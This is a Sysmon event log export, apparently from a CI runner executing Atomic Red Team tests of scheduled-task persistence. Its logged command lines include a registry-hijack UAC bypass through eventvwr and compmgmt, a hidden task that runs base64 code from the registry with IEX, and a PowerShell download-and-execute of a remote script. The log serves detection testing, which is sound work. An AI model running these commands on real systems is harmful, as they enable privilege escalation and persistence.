"TimeCreated","Id","Message"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.462
ProcessGuid: {f995aebf-5514-6942-3100-000000000e00}
ProcessId: 2592
Image: C:\Windows\System32\svchost.exe
TargetFilename: C:\Windows\System32\winevt\Logs\Microsoft-Windows-Winsock-WS2HELP2592Operational.evtx
CreationUtcTime: 2025-12-17 07:59:38.462
User: NT AUTHORITY\LOCAL SERVICE"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.446
ProcessGuid: {f995aebf-5514-6942-3100-000000000e00}
ProcessId: 2592
Image: C:\Windows\System32\svchost.exe
TargetFilename: C:\Windows\System32\winevt\Logs\Microsoft-Windows-Wired-AutoConfig2592Operational.evtx
CreationUtcTime: 2025-12-17 07:59:38.446
User: NT AUTHORITY\LOCAL SERVICE"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.436
ProcessGuid: {f995aebf-5514-6942-3100-000000000e00}
ProcessId: 2592
Image: C:\Windows\System32\svchost.exe
TargetFilename: C:\Windows\System32\winevt\Logs\Microsoft-Windows-WLAN-AutoConfig2592Operational.evtx
CreationUtcTime: 2025-12-17 07:59:38.436
User: NT AUTHORITY\LOCAL SERVICE"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.426
ProcessGuid: {f995aebf-5514-6942-3100-000000000e00}
ProcessId: 2592
Image: C:\Windows\System32\svchost.exe
TargetFilename: C:\Windows\System32\winevt\Logs\Microsoft-Windows-WMPNSS-Service2592Operational.evtx
CreationUtcTime: 2025-12-17 07:59:38.426
User: NT AUTHORITY\LOCAL SERVICE"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.416
ProcessGuid: {f995aebf-5514-6942-3100-000000000e00}
ProcessId: 2592
Image: C:\Windows\System32\svchost.exe
TargetFilename: C:\Windows\System32\winevt\Logs\Microsoft-Windows-WorkFolders2592Operational.evtx
CreationUtcTime: 2025-12-17 07:59:38.416
User: NT AUTHORITY\LOCAL SERVICE"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.404
ProcessGuid: {f995aebf-5514-6942-3100-000000000e00}
ProcessId: 2592
Image: C:\Windows\System32\svchost.exe
TargetFilename: C:\Windows\System32\winevt\Logs\Microsoft-Windows-Workplace Join2592Admin.evtx
CreationUtcTime: 2025-12-17 07:59:38.404
User: NT AUTHORITY\LOCAL SERVICE"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.380
ProcessGuid: {f995aebf-5514-6942-3100-000000000e00}
ProcessId: 2592
Image: C:\Windows\System32\svchost.exe
TargetFilename: C:\Windows\System32\winevt\Logs\Microsoft-Windows-WPD-ClassInstaller2592Operational.evtx
CreationUtcTime: 2025-12-17 07:59:38.373
User: NT AUTHORITY\LOCAL SERVICE"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.365
ProcessGuid: {f995aebf-5514-6942-3100-000000000e00}
ProcessId: 2592
Image: C:\Windows\System32\svchost.exe
TargetFilename: C:\Windows\System32\winevt\Logs\Microsoft-Windows-WPD-CompositeClassDriver2592Operational.evtx
CreationUtcTime: 2025-12-17 07:59:38.365
User: NT AUTHORITY\LOCAL SERVICE"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.355
ProcessGuid: {f995aebf-5514-6942-3100-000000000e00}
ProcessId: 2592
Image: C:\Windows\System32\svchost.exe
TargetFilename: C:\Windows\System32\winevt\Logs\Microsoft-Windows-WPD-MTPClassDriver2592Operational.evtx
CreationUtcTime: 2025-12-17 07:59:38.355
User: NT AUTHORITY\LOCAL SERVICE"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.337
ProcessGuid: {f995aebf-5514-6942-3100-000000000e00}
ProcessId: 2592
Image: C:\Windows\System32\svchost.exe
TargetFilename: C:\Windows\System32\winevt\Logs\Microsoft-Windows-ZTDNS2592BlockedConnections.evtx
CreationUtcTime: 2025-12-17 07:59:38.337
User: NT AUTHORITY\LOCAL SERVICE"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.329
ProcessGuid: {f995aebf-5514-6942-3100-000000000e00}
ProcessId: 2592
Image: C:\Windows\System32\svchost.exe
TargetFilename: C:\Windows\System32\winevt\Logs\Microsoft-Windows-ZTDNS2592Operational.evtx
CreationUtcTime: 2025-12-17 07:59:38.329
User: NT AUTHORITY\LOCAL SERVICE"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.250
ProcessGuid: {f995aebf-5514-6942-3100-000000000e00}
ProcessId: 2592
Image: C:\Windows\System32\svchost.exe
TargetFilename: C:\Windows\System32\winevt\Logs\SMSApi.evtx
CreationUtcTime: 2025-12-17 07:59:38.250
User: NT AUTHORITY\LOCAL SERVICE"
"12/17/2025 7:59:37 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:37.609
ProcessGuid: {f995aebf-552f-6942-d500-000000000e00}
ProcessId: 7572
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:35.827
ProcessGuid: {f995aebf-62e7-6942-7b05-000000000e00}
ProcessId: 8864
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /Run /TN ""EventViewerBypass""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e7-6942-7705-000000000e00}
ParentProcessId: 5116
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\calc.exe"" /f & schtasks /Create /TN ""EventViewerBypass"" /TR ""eventvwr.msc"" /SC ONLOGON /RL HIGHEST /F & ECHO Let's run the schedule task ... & schtasks /Run /TN ""EventViewerBypass""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:35 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:35.812
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\EventViewerBypass
CreationUtcTime: 2025-12-17 07:59:35.812
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:35.796
ProcessGuid: {f995aebf-62e7-6942-7a05-000000000e00}
ProcessId: 2216
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /Create /TN ""EventViewerBypass"" /TR ""eventvwr.msc"" /SC ONLOGON /RL HIGHEST /F 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e7-6942-7705-000000000e00}
ParentProcessId: 5116
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\calc.exe"" /f & schtasks /Create /TN ""EventViewerBypass"" /TR ""eventvwr.msc"" /SC ONLOGON /RL HIGHEST /F & ECHO Let's run the schedule task ... & schtasks /Run /TN ""EventViewerBypass""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:35 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:35.356
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\CompMgmtBypass
CreationUtcTime: 2025-12-17 07:59:35.356
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:35.340
ProcessGuid: {f995aebf-62e7-6942-7405-000000000e00}
ProcessId: 5508
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /Create /TN ""CompMgmtBypass"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e7-6942-7105-000000000e00}
ParentProcessId: 4708
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\calc.exe"" /f & schtasks /Create /TN ""CompMgmtBypass"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F & ECHO Let's open the Computer Management console now... & compmgmt.msc
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:34 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:34.782
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\AtomicTaskModifed
CreationUtcTime: 2025-12-17 07:59:34.782
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:34 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:34.319
ProcessGuid: {f995aebf-62e6-6942-6d05-000000000e00}
ProcessId: 9676
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u5r1ubn4.h4m.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:34 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:34.300
ProcessGuid: {f995aebf-62e6-6942-6d05-000000000e00}
ProcessId: 9676
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u5r1ubn4.h4m.ps1
CreationUtcTime: 2025-12-17 07:59:34.300
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:34 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:59:32.124
ProcessGuid: {f995aebf-62e3-6942-6305-000000000e00}
ProcessId: 10072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59082
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:59:33 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:59:32.121
ProcessGuid: {f995aebf-62e3-6942-6305-000000000e00}
ProcessId: 10072
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:33.975
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\atomic red team
CreationUtcTime: 2025-12-17 07:59:33.975
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:33 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:33.687
ProcessGuid: {f995aebf-62e5-6942-6b05-000000000e00}
ProcessId: 6448
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_b40wyxjx.ovg.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:33.670
ProcessGuid: {f995aebf-62e5-6942-6b05-000000000e00}
ProcessId: 6448
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_b40wyxjx.ovg.ps1
CreationUtcTime: 2025-12-17 07:59:33.670
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:33.594
ProcessGuid: {f995aebf-62e5-6942-6b05-000000000e00}
ProcessId: 6448
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$xml = [System.IO.File]::ReadAllText(\""""C:\AtomicRedTeam\atomics\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml\"""")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \""""Root\Microsoft\Windows\TaskScheduler\"""" -MethodName \""""RegisterByXml\"""" -Arguments @{ Force = $true; Xml =$xml; }}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:33.364
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\ATOMIC-T1053.005
CreationUtcTime: 2025-12-17 07:59:33.364
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:33.349
ProcessGuid: {f995aebf-62e5-6942-6a05-000000000e00}
ProcessId: 5460
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks.exe  /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e5-6942-6705-000000000e00}
ParentProcessId: 3292
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:33.318
ProcessGuid: {f995aebf-62e5-6942-6705-000000000e00}
ProcessId: 3292
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:33.069
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\T1053_005_WMI
CreationUtcTime: 2025-12-17 07:59:33.069
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:32 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:32.781
ProcessGuid: {f995aebf-62e4-6942-6505-000000000e00}
ProcessId: 6384
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u30xwze0.0py.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:32 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:32.763
ProcessGuid: {f995aebf-62e4-6942-6505-000000000e00}
ProcessId: 6384
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u30xwze0.0py.ps1
CreationUtcTime: 2025-12-17 07:59:32.763
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:32.691
ProcessGuid: {f995aebf-62e4-6942-6505-000000000e00}
ProcessId: 6384
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$xml = [System.IO.File]::ReadAllText(\""""C:\AtomicRedTeam\atomics\T1053.005\src\T1053_005_WMI.xml\"""")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \""""Root\Microsoft\Windows\TaskScheduler\"""" -MethodName \""""RegisterByXml\"""" -Arguments @{ Force = $true; Xml =$xml; }}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:31 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:31.902
ProcessGuid: {f995aebf-62e3-6942-6305-000000000e00}
ProcessId: 10072
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5jdxb4ii.pgy.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:31 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:31.886
ProcessGuid: {f995aebf-62e3-6942-6305-000000000e00}
ProcessId: 10072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5jdxb4ii.pgy.ps1
CreationUtcTime: 2025-12-17 07:59:31.886
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:31 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:31.809
ProcessGuid: {f995aebf-62e3-6942-6305-000000000e00}
ProcessId: 10072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing) 
Invoke-MalDoc -macroFile \""""C:\AtomicRedTeam\atomics\T1053.005\src\T1053.005-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""Scheduler\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:31 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:31.548
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\AtomicTask
CreationUtcTime: 2025-12-17 07:59:31.547
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:31 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:31.047
ProcessGuid: {f995aebf-62e2-6942-6105-000000000e00}
ProcessId: 8376
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rbjo1xmf.phn.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:31 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:31.029
ProcessGuid: {f995aebf-62e2-6942-6105-000000000e00}
ProcessId: 8376
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rbjo1xmf.phn.ps1
CreationUtcTime: 2025-12-17 07:59:31.029
User: runnervm8j6r3\runneradmin"
